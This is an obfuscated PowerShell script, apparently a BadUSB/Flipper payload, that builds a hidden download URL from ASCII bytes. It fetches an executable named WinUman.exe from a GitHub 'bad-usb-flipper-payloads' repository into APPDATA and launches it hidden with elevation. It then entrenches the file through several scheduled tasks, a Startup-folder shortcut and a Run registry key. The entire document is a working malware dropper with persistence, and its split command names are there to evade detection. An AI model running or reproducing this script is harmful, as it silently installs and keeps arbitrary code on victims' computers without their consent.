# Split important functions into pieces
${n} = 'N'+'ew'+'-Ob'+'ject'
${e} = [Text.Encoding]::ASCII

# Build the EXE download URL from ASCII bytes
${u} = ${e}::GetString(([byte[]](104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,116,104,101,45,115,104,97,100,111,119,45,119,97,108,107,101,114,47,98,97,100,45,117,115,98,45,102,108,105,112,112,101,114,45,112,97,121,108,111,97,100,115,47,109,97,105,110,47,69,88,69,47,87,105,110,85,109,97,110,46,101,120,101)))

# File path
${p} = "$env:APPDATA" + ('\'+'WinUman.exe')

# Download the file
&("Inv"+"oke-WebRequest") -Uri ${u} -OutFile ${p} -UseBasicParsing

# Execute file hidden with elevation
&("St"+"art-Process") -FilePath ${p} -Verb ("Ru"+"nAs") -WindowStyle Hidden

# Task Action, Trigger
${a} = &("New-Sch"+"eduledTaskAction") -Execute ${p}
${t1} = &("New-Sch"+"eduledTaskTrigger") -AtLogOn

# Escape file path for schtasks
${escaped} = ${p} -replace '\\','\\\\'

# Alt trigger using schtasks manually
&("schtasks") /Create /F /TN "WinUmanUnlock" /TR "${escaped}" /SC ONUNLOCK /RL HIGHEST /RU "$env:USERNAME" >$null

# Settings and principal
${s} = &("New-Sch"+"eduledTaskSettingsSet") -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RestartCount 5 -RestartInterval (New-TimeSpan -Minutes 1) -StartWhenAvailable
${pr} = &("New-Sch"+"eduledTaskPrincipal") -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest

# Register task
${task} = &("New-Sch"+"eduledTask") -Action ${a} -Trigger ${t1} -Settings ${s} -Principal ${pr}
&("Register-Sch"+"eduledTask") -TaskName "WinUmanResilient" -InputObject ${task} -Force

# Create shortcut in Startup folder
${shell} = &${n} -ComObject WScript.Shell
${sPath} = "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WinUman.lnk"
${sh} = ${shell}.CreateShortcut(${sPath})
${sh}.TargetPath = ${p}
${sh}.WorkingDirectory = (Split-Path ${p})
${sh}.WindowStyle = 7
${sh}.Description = "WU Shortcut"
${sh}.Save()

# Registry Run key fallback
&("Set-I"+"temProperty") -Path ("HKCU:\Software\Microsoft\Windows\CurrentVersion\Run") -Name "WinUman" -Value ${p}
